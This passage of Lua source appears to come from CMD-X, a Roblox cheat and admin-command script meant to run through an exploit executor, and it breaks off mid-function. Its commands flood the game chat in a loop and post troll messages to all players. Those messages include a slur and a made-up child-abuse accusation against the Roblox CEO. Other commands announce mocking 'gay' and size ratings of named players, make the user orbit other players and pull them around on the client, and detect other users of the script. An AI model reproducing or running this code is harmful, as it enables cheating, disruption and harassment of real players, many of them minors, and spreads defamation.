	BtnExitHotkey.Parent = ManageHolderHotkey
	BtnExitHotkey.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	BtnExitHotkey.BackgroundTransparency = 1.000
	BtnExitHotkey.BorderSizePixel = 0
	BtnExitHotkey.Position = UDim2.new(0.950231194, 0, -0.00778063387, 0)
	BtnExitHotkey.Size = UDim2.new(0, 28, 0, 26)
	BtnExitHotkey.Font = Enum.Font.GothamBold
	BtnExitHotkey.Text = "X"
	BtnExitHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnExitHotkey.TextSize = 14.000
	BtnExitHotkey.MouseButton1Down:Connect(function()
		for i,v in pairs(hkBinds) do
			if hkBinds.C == "Unnamed" then
				table.remove(hkBinds,i)
			end
		end
		ManageHolderHotkey.Visible = false
		Edit1Hotkey.Text = ""
		Edit2Hotkey.Text = ""
		Edit3Hotkey.Text = ""
		SlideOutHotkey.Visible = false
		SlideOutHotkey:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
		updatesaves()
	end)

	function useCommand.hotkeynew()
		if arguments[3] then
			arguments[2] = arguments[2]:lower()
			hkBinds[#hkBinds+1] = {K = arguments[2], C = arguments[3]}
			updatesaves()
			opx("-","Added "..arguments[3].." to hotkeys")
		else
			opx("*","3 arguments are needed for this command!")
		end
	end

	function useCommand.hotkeys()
		opx("-","Hotkeys opened")
		MangeScrollHotkey:ClearAllChildren()
		ManageHolderHotkey.Visible = true
		for i,v in pairs(hkBinds) do
			Template1(hkBinds[i].C,i)
		end
	end

	function useCommand.listhotkeys()
		xHK = #hkBinds.." | "
		for i = 1,#hkBinds do
			xHK = xHK..hkBinds[i].K.." - "..hkBinds[i].C..", "
		end
		opx("-","Listed hotkeys")
		opxL("Hotkeys",xHK)
	end

	function useCommand.hotkeydel()
		if arguments[2] then
			for i = 1,#hkBinds do
				if hkBinds[i].C == arguments[2] then
					table.remove(hkBinds[i])
					updatesaves()
				end
			end
			opx("-","Removed "..arguments[2].." from hotkeys")
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.hotkeysclr()
		hkBinds = {}
		updatesaves()
		opx("-","Cleared all hotkeys")
	end

	function useCommand.changestyle()
		if arguments[2] then
			opx("-","Style set to "..arguments[2])
			for i,v in pairs(Unnamed.holder.output:GetChildren()) do
				if v:IsA("ImageLabel") then
					output1.Parent = output
					output2.Parent = output
					output3.Parent = output
					output4.Parent = output
					output5.Parent = output
					output6.Parent = output
					output7.Parent = output
					output8.Parent = output
					output9.Parent = output
					v:Destroy()
				end
			end
			entry.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			output1.TextColor3 = Color3.fromRGB(177, 177, 177)
			output2.TextColor3 = Color3.fromRGB(177, 177, 177)
			output3.TextColor3 = Color3.fromRGB(177, 177, 177)
			output4.TextColor3 = Color3.fromRGB(177, 177, 177)
			output5.TextColor3 = Color3.fromRGB(177, 177, 177)
			output6.TextColor3 = Color3.fromRGB(177, 177, 177)
			output7.TextColor3 = Color3.fromRGB(177, 177, 177)
			output8.TextColor3 = Color3.fromRGB(177, 177, 177)
			output9.TextColor3 = Color3.fromRGB(177, 177, 177)
			cmd.TextColor3 = Color3.fromRGB(177,177,177)
			cmd.PlaceholderColor3 = Color3.fromRGB(177,177,177)
			if arguments[2] == "default" or arguments[2] == "rounded" then
				output.Style = Enum.FrameStyle.RobloxRound
				dStyle = "rounded"
				updatesaves()
			elseif arguments[2] == "bg" then
				function getAsset(ID)
					return("http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=420&height=420&assetId="..ID)
				end
				output.Style = Enum.FrameStyle.Custom
				dStyle = "bg "..arguments[3]
				updatesaves()
				local iBG = Instance.new("ImageLabel", output)
				iBG.BackgroundColor3 = Color3.fromRGB(163,182,165)
				iBG.BackgroundTransparency = 1
				iBG.BorderSizePixel = 0
				iBG.Size = UDim2.new(0, 525, 0, 253)
				output1.Parent = iBG
				output2.Parent = iBG
				output3.Parent = iBG
				output4.Parent = iBG
				output5.Parent = iBG
				output6.Parent = iBG
				output7.Parent = iBG
				output8.Parent = iBG
				output9.Parent = iBG
				iBG.Image = getAsset(arguments[3])
				iBG.ScaleType = Enum.ScaleType.Crop
			elseif arguments[2] == "squared" then
				output.Style = Enum.FrameStyle.RobloxSquare
				dStyle = "squared"
				updatesaves()
			elseif arguments[2] == "blended" then
				output.Style = Enum.FrameStyle.Custom
				dStyle = "blended"
				updatesaves()
			elseif arguments[2] == "smalled" then
				output.Style = Enum.FrameStyle.DropShadow
				dStyle = "smalled"
				updatesaves()
			elseif arguments[2] == "light" or arguments[2] == "lightmode" then
				entry.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
				output1.TextColor3 = Color3.fromRGB(1, 1, 1)
				output2.TextColor3 = Color3.fromRGB(1, 1, 1)
				output3.TextColor3 = Color3.fromRGB(1, 1, 1)
				output4.TextColor3 = Color3.fromRGB(1, 1, 1)
				output5.TextColor3 = Color3.fromRGB(1, 1, 1)
				output6.TextColor3 = Color3.fromRGB(1, 1, 1)
				output7.TextColor3 = Color3.fromRGB(1, 1, 1)
				output8.TextColor3 = Color3.fromRGB(1, 1, 1)
				output9.TextColor3 = Color3.fromRGB(1, 1, 1)
				cmd.TextColor3 = Color3.fromRGB(1,1,1)
				cmd.PlaceholderColor3 = Color3.fromRGB(1,1,1)
				if arguments[3] then
					if arguments[3] == "blue" then
						output.Style = Enum.FrameStyle.ChatBlue
						dStyle = "lightblue"
						updatesaves()
					elseif arguments[3] == "green" then
						output.Style = Enum.FrameStyle.ChatGreen
						dStyle = "lightgreen"
						updatesaves()
					elseif arguments[3] == "red" then
						output.Style = Enum.FrameStyle.ChatRed
						dStyle = "lightred"
						updatesaves()
					else
						output.Style = Enum.FrameStyle.ChatBlue
						dStyle = "lightblue"
						updatesaves()
					end
				else
					output.Style = Enum.FrameStyle.ChatBlue
					dStyle = "lightblue"
					updatesaves()
				end
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.chat()
		if arguments[2] then
			local chatString = getstring(2)
			sayremote:FireServer(chatString, "All")
			opx("-","Said message in chat")
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.curvetools()
		local currentTool = cmdlp.Character:FindFirstChildOfClass("Tool")
		currentTool.Parent = cmdlp.Backpack
		Number = 1
		for i,v in pairs(cmdlp.Backpack:GetChildren()) do
			if v.Name == currentTool.Name then
				v.GripPos = Vector3.new(0,0,0)
				v.GripRight = Vector3.new(0,0,0)
				v.GripPos = Vector3.new(0,-Number,Number)
				v.GripRight = Vector3.new(math.rad(10+-Number),math.rad(Number),math.rad(90+-Number))
				Number = Number + 1.4
				v.Parent = cmdlp.Character
			end
		end
		opx("-","Now curving tools")
	end

	function useCommand.spiraltools()
		local currentTool = cmdlp.Character:FindFirstChildOfClass("Tool")
		currentTool.Parent = cmdlp.Backpack
		Number = 1
		for i,v in pairs(cmdlp.Backpack:GetChildren()) do
			if v.Name == currentTool.Name then
				v.GripPos = Vector3.new(0,0,0)
				v.GripRight = Vector3.new(0,0,0)
				v.GripPos = Vector3.new(0,Number,-Number)
				v.GripRight = Vector3.new(math.rad(Number),math.rad(180/Number),math.rad(180/Number))
				Number = Number + 1.4
				v.Parent = cmdlp.Character
			end
		end
		opx("-","Now spiraling tools")
	end

	function useCommand.parts()
		if arguments[2] then
			opx("-","Now listing all parts in "..arguments[2])
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == arguments[2] then
					xName = v
				end
			end
			local xParts = #xName:GetDescendants().." | "
			for i,v in pairs(xName:GetDescendants()) do
				xParts = xParts..v.Name..", "
			end
			opxL("Parts",xParts)
		else
			opx("-","Now listing all parts")
			local xParts = #workspace:GetDescendants().." | "
			for i,v in pairs(workspace:GetDescendants()) do
				xParts = xParts..v.Name..", "
			end
			opxL("Parts",xParts)
		end
	end

	function useCommand.toggleconfly()
		if arguments[2] then
			if arguments[2] == "on" then
				conFly = true
				updatesaves()
				opx("-","Continuous fly was toggled to on")
			elseif arguments[2] == "off" then
				conFly = false
				updatesaves()
				opx("-","Continuous fly was toggled to off")
			else
				opx("*","The second argument must contain 'on' or 'off'")
			end
		else
			opx("*","2 arguments are required for this command")
		end
	end

	local chatlag = false
	function useCommand.lagchat()
		opx("-","Now lagging chat")
		chatlag = true
		while chatlag do
			wait()
			sayremote:FireServer("_______________________________________", "All")
		end
	end

	function useCommand.funfact()
		local URL = ("https://uselessfacts.jsph.pl/random.json?language=en")
		local fuck = game:HttpGet(URL)
		local Http = game:GetService("HttpService"):JSONDecode(fuck)
		opx("-",Http.text)
		sayremote:FireServer(Http.text,"All")
	end

	function useCommand.trollchat()
		trollChat = {
			"Roses are red, silent as a mouse, your door is unlocked, I'm inside your house",
			"my dads's uncle owens fortnite his gonna get you banned ###### noob",
			"Ok that one was funny, say it again it gets funnier each time you say it.",
			"nvm just found out ur a girl",
			"I have more chromosomes than you wetard.",
			"What's a _G statement?",
			"Can somebody give me robux my dad is builderman!",
			"Can someone please buy my shirt from my group?",
			"Turn down the music please! My mom said so.",
			"My favorite type of ice cream is glue.",
			"May I join you guys?",
			"What's a GUI?",
			"I'm level 126 on Clockwork's Level Calculator",
			"This game is honestly so bad, don't know why people play it.",
			"Anyone else play Roblox here?",
			"I'm new, any help?",
			"Can you give me Robux, please?",
			"Please stop trolling!",
			"You aren't cool stop trying to kill me.",
			"Why are you so mean?",
			"Guys, kill the bacon for free Cheez-Its.",
			"Why do people even buy headless? It's really useless!",
			"Stop!!!!!!!",
			"_____________________",
			"Please leave me alone?",
			"Sources say David Baszucki is looking at a 20 year sentence for fiddling with kids.",
			"Why do people even hate on Fortnite?",
			"I heard Erik Cassel has been working on an update for 7 years.",
			"Welcome to Roblox!",
			"I'm considering picking up Roblox as a long term job.",
			"Club Iris's owner, SoulJem is adding more backdoors in his game today.",
			"I use JJSploit, It's way better than Synapse X.",
			"Why am I getting so much attention?",
			"Everyone hates me. :(",
			"Flamingo is a good youtuber he is my favourite, YO TENGO!",
			"Why is no one talking to me? I'm famous you know?",
			"You are all poor, I have 10 robux.",
			"I have 100 followers, you are a nobody.",
			"I heard maplestick feeds exploiters with his hats, is this true?",
			"Removing TIX was a good idea like that thing was so useless, XD.",
			"What is TIX? xd? Sounds stupid XD.",
			"I heard InceptionTime is in the gzxy bar right now.",
			"Guys use the weakest weapons, it raises your chance to deal 100 damage.",
			"Guys is Synapse X a virus?",
			"Hello. Im Am. Play. Roblox,",
			"Hi Youtube today we are playing this game.",
			"Poor people are the bane of this game, pls nerf.",
			"I am on the leaderboards of this game, everyone here is bad.",
			"My dads goldfish works for Roblox.",
			"Guys how do I fake cxncer to get a Sinister Valk?",
			"Why are you bald? Are you planning to get Sinister Valk?",
			"Guys my bed time is in 10 minutes, please hurry up.",
			"Why are you taking so long?",
			"Can you be quiet? Stop talking.",
			"What is Builders Club XD? It sounds stupid tbh.",
			"I have the best score on this game, plus I know the owner.",
			"Guys you can all leave you are useless I can do this on my own.",
			"This game is pretty bad tbh XD, I could make better.",
			"You have trash scripts XD I use JJSploit and invisible fling.",
			"......... bad. xd",
			"I'm considering building a game about breaking out of a jail and robbing stuff, should I?",
			"I'm considering making a game about breaking bones, should I?",
			"I'm considering making Roblox streaming a full time job, I got a 2$ donation.",
			"I use UltimateDLLInjector, what DLL's do you use? Can you send me them?",
			"All old games are bad, why would you even play them they are glitchy.",
			"Old robloxians, are stupid I bet they can't even play Bloxburg as well as me",
			"I love DenisDaily I want to meet him."
		}
		local value = math.random(1,#trollChat)
		local picked_value = trollChat[value]
		opx("-","You troll chatted")
		sayremote:FireServer(tostring(picked_value), "All")
	end

	function useCommand.unbodypositionwalkspeed()
		bodyPos = false
		for i,v in pairs(cmdlp.Character:GetDescendants()) do
			if v.Name == "rocket" then
				v:Destroy()
			end
		end
		opx("-","BodyPositionWalkSpeed disabled")
	end

	function useCommand.removegears()
		opx("-","Removed gears")
		for i,v in pairs(cmdlp.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				v:Destroy()
			end
		end
	end

	function useCommand.unclicktp()
		opx("-","No longer clicktping")
		clicktps = false
	end

	for i,v in pairs(cmdp:GetPlayers()) do
		v.Chatted:Connect(function(t)
			if t:sub(1,19) == "SCHAT/console/type/" then
				local msg = t:sub(20,#t)
				CreateSCLabel("USER",v.Name..": "..msg)
			end
		end)
	end

	cmdp.PlayerAdded:Connect(function(v)
		v.Chatted:Connect(function(t)
			if t:sub(1,19) == "SCHAT/console/type/" then
				local msg = t:sub(20,#t)
				if t:sub(1,19) == "SCHAT/console/type/" then
					local msg = t:sub(20,#t)
					CreateSCLabel("USER",v.Name..": "..msg)
				end
			end
		end)
	end)

	function useCommand.scriptusers()
		if sDetect then
			opx("-","This may take a while...")
			local xUsing = ""
			local xUsingCount = 0
			for i,v in pairs(cmdp:GetPlayers()) do
				local check1 = v.Character:FindFirstChild("Head")
				if check1 then
					local check2 = check1:FindFirstChild(AntiCheat.Attachment)
					if not check2 then
						local v = v.UserId
						if Devs[v] then
							xUsing = xUsing.."["..Devs[v]:upper().."]"..Players:GetNameFromUserIdAsync(v).."\n"
						elseif Donors[v] then
							xUsing = xUsing.."["..Tier[Donors[v]].SCHAT.."]"..Players:GetNameFromUserIdAsync(v).."\n"
						else
							xUsing = xUsing.."[USER]"..Players:GetNameFromUserIdAsync(v).."\n"
						end
						xUsingCount = xUsingCount + 1
					end
				end
			end
			opx("-","Now showing users using CMD-X")
			opxL("Using ["..xUsingCount.."]",xUsing)
		else
			opx("*","Turn noshow off to see other users")
		end
	end

	function useCommand.cleanhats()
		opx("-","Cleaning up any hats...")
		for _,v in pairs(cmdlp.Character:GetChildren()) do if v:IsA("Accessory") then v:Destroy() end end
		local hatConnection = cmdlp.Character.ChildAdded:Connect(function(c)
			if c:IsA("Accessory") then
				game:GetService("RunService").Heartbeat:wait()
				c:Destroy()
			end
		end)
		while workspace:FindFirstChildOfClass("Accessory") do
			for _,v in pairs(workspace:GetChildren()) do
				if v:IsA("Accessory") and v:FindFirstChild("Handle") then
					firetouchinterest(cmdlp.Character.HumanoidRootPart, v.Handle, 0)
					firetouchinterest(cmdlp.Character.HumanoidRootPart, v.Handle, 1)
				end
			end
			game:GetService("RunService").Heartbeat:wait()
		end
		hatConnection:Disconnect()
		opx("-","All hats cleaned")
	end

	function useCommand.mentions()
		if arguments[2] == "on" then
			mentions = true
			updatesaves()
			opx("-","Turned on mentions")
		elseif arguments[2] == "off" then
			mentions = false
			updatesaves()
			opx("-","Turned off mentions")
		else
			opx("*","Not a valid preset!")
		end
	end

	function useCommand.schatbp()
		opx("*","No longer used")
	end

	function useCommand.whisperlogs()
		logsEnabled = false
		pLogs = false
		opx("-","Whipser-Logs have been loaded")
		wLogs = true
		logsholding.Visible = true
	end

	CurrentPLog = {}

	function useCommand.playerlogs()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				logsEnabled = false
				wLogs = false
				opx("-","Player-Logs have been loaded")
				table.insert(CurrentPLog,target)
				pLogs = true
				logsholding.Visible = true
				target.Chatted:Connect(function(msg)
					if pLogs == true then
						CreateLabel(target.Name,msg)
					end
				end)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.scriptchat()
		logsholding2.Visible = true
		opx("-","Script chat is now active")
	end

	function useCommand.unswimwalk()
		workspace.Gravity = 198
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		cmdlp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
		opx("-","No longer swimming")
	end

	function useCommand.fakelag()
		opx("-","Now fake lagging, do anything you want")
		settings():GetService("NetworkSettings").IncommingReplicationLag = 100
	end

	function useCommand.unfakelag()
		opx("-","No longer fake lagging")
		settings():GetService("NetworkSettings").IncommingReplicationLag = 0
	end

	function useCommand.hitboxes()
		opx("-","Now showing hitboxes")
		settings():GetService("RenderSettings").ShowBoundingBoxes = true
	end

	function useCommand.unhitboxes()
		opx("-","No longer showing hitboxes")
		settings():GetService("RenderSettings").ShowBoundingBoxes = false
	end

	function useCommand.animdata()
		opx("-","Now showing animation data")
		settings():GetService("NetworkSettings").ShowActiveAnimationAsset = true
	end

	function useCommand.unanimdata()
		opx("-","No longer showing animation data")
		settings():GetService("NetworkSettings").ShowActiveAnimationAsset = false
	end

	function useCommand.unlagchat()
		opx("-","No longer lagging chat")
		chatlag = false
	end

	function useCommand.sniper()
		opx("-","If you had a sniper then you are now holding it")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = hat.Name
				tool.GripPos = Vector3.new(0, -1, 0)
				tool.GripRight = Vector3.new(-0.005, 0.004, -1)
				tool.GripUp = Vector3.new(0.758, 0.653, -0.001)
				tool.GripForward = Vector3.new(-0.653, 0.758, 0.006) 
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
	end

	function useCommand.rocket()
		opx("-","If you had a rocket then you are now holding it")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = hat.Name
				tool.GripPos = Vector3.new(1, 0, 0)
				tool.GripRight = Vector3.new(-0.245, 0, 0.969)
				tool.GripUp = Vector3.new(-0.749, 0.634, -0.19)
				tool.GripForward = Vector3.new(0.615, 0.773, 0.156)
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
	end

	function useCommand.clip()
		if Noclipping then
			Noclipping:Disconnect()
		end
		Clip = true
		opx("-","Noclip disabled")
	end

	function useCommand.closeorbit()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local rp = Instance.new("RocketPropulsion")
				rp.Parent = cmdlp.Character.HumanoidRootPart
				rp.CartoonFactor = 1
				rp.MaxThrust = 5000
				rp.MaxSpeed = 100
				rp.ThrustP = 5000
				rp.Name = "OrbitalDestruction"
				rp.Target = target.Character.HumanoidRootPart
				rp:Fire()
				cmdlp.Character.Humanoid.Sit = true
				opx("-","Now orbiting: "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.orbit()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-","Now orbiting: "..target.Name)
				local P = Instance.new("Part", target.Character)
				P.Transparency = 1
				P.Name = "ThePart"
				P.Size = Vector3.new(1.7,1.7,1.7)
				P.Massless = true
				P.CanCollide = false
				local W = Instance.new("Weld", P)
				W.Part1 = target.Character.HumanoidRootPart
				W.Part0 = P
				local sine = 0
				local change = 1
				local spin = 0
				local spin2 = 0
				local rp = Instance.new("RocketPropulsion")
				rp.Parent = cmdlp.Character.HumanoidRootPart
				rp.CartoonFactor = 1
				rp.MaxThrust = 5000
				rp.MaxSpeed = 100
				rp.ThrustP = 5000
				rp.Name = "OrbitalDestructionPart"
				rp.Target = target.Character.ThePart
				rp:Fire()
				cmdlp.Character.Humanoid.PlatformStand = true
				while true do
					game:GetService("RunService").RenderStepped:wait()
					sine = sine + change
					spin2 = spin2 + 0.6
					spin = spin + 1
					W.C0 = CFrame.new(7 * math.cos(20),-2 - 2 * math.sin(sine/10),7 * math.sin(20))*CFrame.Angles(math.rad(0),math.rad(spin),math.rad(0))
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unorbit()
		for i,v in pairs(cmdlp.Character:GetDescendants()) do
			if v.Name == "OrbitalDestructionPart" or v.Name == "OrbitalDestruction" then
				v:Destroy()
			end
		end
		cmdlp.Character.Humanoid.PlatformStand = false
		cmdlp.Character.Humanoid.Sit = false
		opx("-","Stopped orbiting")
	end

	function useCommand.suggestions()
		if arguments[2] == "on" then
			suggestions = true
			updatesaves()
			opx("-","Suggestions set to on")
		elseif arguments[2] == "off" then
			suggestions = false
			updatesaves()
			opx("-","Suggestions set to off")
		else
			opx("*","A valid preset is needed!")
		end
	end

	local bringc = {}
	function useCommand.clientbring()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-","Bringing "..target.Name.." on client.")
				bringc[target] = game:GetService("RunService").RenderStepped:Connect(function()
					if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
						target.Character.HumanoidRootPart.CFrame = cmdlp.Character.HumanoidRootPart.CFrame + cmdlp.Character.HumanoidRootPart.CFrame.lookVector * 3
					end
				end)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.unclientbring()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				bringc[target]:Disconnect()
				opx("-","Stopped client bringing "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.clientfreeze()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-","Now client freezing "..target.Name)
				for i,v in pairs(target.Character:GetChildren()) do
					if v:IsA("BasePart") then
						v.Anchored = true
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.unclientfreeze()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-","No longer client freezing "..target.Name)
				for i,v in pairs(target.Character:GetChildren()) do
					if v:IsA("BasePart") then
						v.Anchored = false
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.removefog()
		opx("-","Removed fog")
		cmdl.FogStart = 0
		cmdl.FogEnd = 9999999999999
	end

	local animsyncconnection
	function useCommand.animsync()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				animsyncconnection = target.Character.Humanoid.AnimationPlayed:Connect(function(track)
					local animID = track.Animation.AnimationId
					for _, animationTrack in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
						animationTrack:Stop()
					end
					cmdlp.Character.Animate.Disabled = true
					local Anim = Instance.new("Animation")
					Anim.AnimationId = animID
					local salute = cmdlp.Character.Humanoid:LoadAnimation(Anim)
					salute:Play()
					salute:AdjustWeight(10)
					salute.Stopped:Connect(function()
						cmdlp.Character.Animate.Disabled = false
					end)
				end)
				opx("-","Now syncing with "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.unanimsync()
		if animsyncconnection == nil then
			return opx("*", "Not currently syncing")
		end
		animsyncconnection:Disconnect()
		opx("-","No longer syncing")
	end

	function useCommand.playercases()
		opx("-","Listed player cases")
		opxL("Player-cases","me - Chooses you\
	random - Chooses a random player\
	new - Chooses a player under the age of 30\
	old - Chooses a player over the age of 30\
	bacon - Chooses a player with a bacon hair\
	friend - Chooses a player that is friends with you\
	notfriend - Chooses a player that is not friends with you\
	ally - Chooses a player that is on the same team as you\
	enemy - Chooses a player that is not on the same team as you\
	near - Chooses a player that is close to you\
	far - Chooses a player that is not close to you\
	using - Chooses a player that is using CMD-X")
	end

	function useCommand.nomessages()
		if _G.connections["MessageGame"] then
			opx("*","NoMessages is already loaded!")
			return
		end
		opx("-","NoMessages is now on")
		_G.connections.MesssageGame = workspace.DescendantAdded:Connect(function(v) if v:IsA("Message") then v:Destroy() end end)
		_G.connections.MessagesHD = cmdlp.PlayerGui.HDAdminGUIs.MessageContainer.Messages.ChildAdded:Connect(function(v) v:Destroy() end)
	end

	function useCommand.yesmessages()
		if not _G.connections.MessageGame then
			opx("*","NoMessages is not already loaded!")
			return
		end
		opx("-","NoMessages is no longer on")
		_G.connections.MessageGame:Disconnect()
		_G.connections.MessageHD:Disconnect()
	end

	function useCommand.ppsize()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local PPTable = {"Non-Existant","Microscopic","Tiny","Very Small","Small","Moderate","Average","Above Average","Big","Massive","Hugh Mungus","Gut Destroyer"}
				math.randomseed(target.UserId + 2131)
				local pickPP = math.random(1,#PPTable)
				opx("-",target.Name.." has a "..PPTable[pickPP].." sizePP")
				sayremote:FireServer(target.Name.." has a "..PPTable[pickPP].." sized sausage","All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.gaysize()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				math.randomseed(target.UserId + 23095)
				local gayREAL = math.random(0,100)
				opx("-",target.Name.." is "..gayREAL.."% gay")
				sayremote:FireServer(target.Name.." is "..gayREAL.."% gay","All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.matchmake()
		if arguments[3] then
			target = findplr(arguments[2])
			local target2 = findplr(arguments[3])
			if target and target2 then
				math.randomseed(target2.UserId + target.UserId + 111)
				local matchREAL = math.random(0,100)
				opx("-",target.Name.." and "..target2.Name.." are a "..matchREAL.."% match")
				sayremote:FireServer(target.Name.." and "..target2.Name.." are a "..matchREAL.."% match","All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","3 arguments are required for this command!")
		end
	end

	function useCommand.height()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				math.randomseed(target.UserId + 10111)
				local height1 = math.random(4,7)
				local height2 = math.random(0,11)
				opx("-",target.Name.." is "..height1.."'"..height2)
				sayremote:FireServer(target.Name.." is "..height1.."'"..height2,"All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	local deadRefresh = {}
	function useCommand.refreshdead()
		if deadRefresh.died then
			return opx("*", "Already active")
		end
		deadRefresh.pos = cmdlp.Character.HumanoidRootPart.CFrame

		deadRefresh.died = cmdlp.Character.Humanoid.Died:Connect(function()
			deadRefresh.pos = cmdlp.Character.HumanoidRootPart.CFrame
		end)
		deadRefresh.respawned = cmdlp.CharacterAdded:Connect(function(character)
			character:WaitForChild("HumanoidRootPart").CFrame = deadRefresh.pos
			deadRefresh.died = cmdlp.Character.Humanoid.Died:Connect(function()
				deadRefresh.pos = cmdlp.Character.HumanoidRootPart.CFrame
			end)
		end)
		opx("-","Refresh dead is now on")
	end

	function useCommand.unrefreshdead()
		deadRefresh.pos = nil
		deadRefresh.died:Disconnect()
		deadRefresh.respawned:Disconnect()
		opx("-", "Refresh dead is now off")
	end

	function useCommand.enablereset()
		opx("-","Force enabled reset button")
		game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
	end

	function useCommand.disablereset()
		opx("-","Force disabled reset button")
		game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
	end

	local looping = false
	function useCommand.loop()
		if arguments[2] then
			looping = true
			loopStat = getstring(2)
			perCmd = arguments[2]
			GoodNew = findCmd(perCmd)
			opx("-","Now looping that command")
			while looping do
				wait()
				arguments = loopStat:split(" ")
				useCommand[GoodNew]()
			end
		else
			opx("*","2 arguments are needed!")
		end
	end

	function useCommand.unloop()
		looping = false
		wait(.1)
		opx("-","No longer looping commands")
	end

	function useCommand.savetools()
		opx("-","Saved tools")
		for i,a in pairs(cmdlp.Backpack:GetDescendants()) do
			if a:IsA("Tool") then
				a.Parent = cmdlp.Character
				a.Parent = workspace
				a.Handle.Anchored = true
			end
		end
	end

	function useCommand.loadtools()
		opx("-","Loaded tools")
		for i,v in pairs(workspace:GetChildren()) do
			if v:IsA("Tool") and v.Handle.Anchored == true then
				v.Handle.Anchored = false
				v.Handle.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
			end
		end
	end

	function useCommand.hotkeyfly()
		if arguments[2] then
			opx("Hotkey set to "..arguments[2])
			hotkeyfly = arguments[2]
			updatesaves()
		else
			opx("A key is required")
		end
	end

	function useCommand.plague()
		if arguments[2] then
			opx("-","You started a plague!")
			cureFound = false
			plaguename = arguments[2] 
			if #cmdp:GetPlayers() > 6 then  
				for i,v in pairs(cmdp:GetPlayers()) do 
					wait(math.random(1,15))
					if i == 1 then
						cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." is the ZeroDay of "..plaguename, "All")
					elseif i == 2 then
						cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plaguename.." was put on the watchlist by RHO", "All")
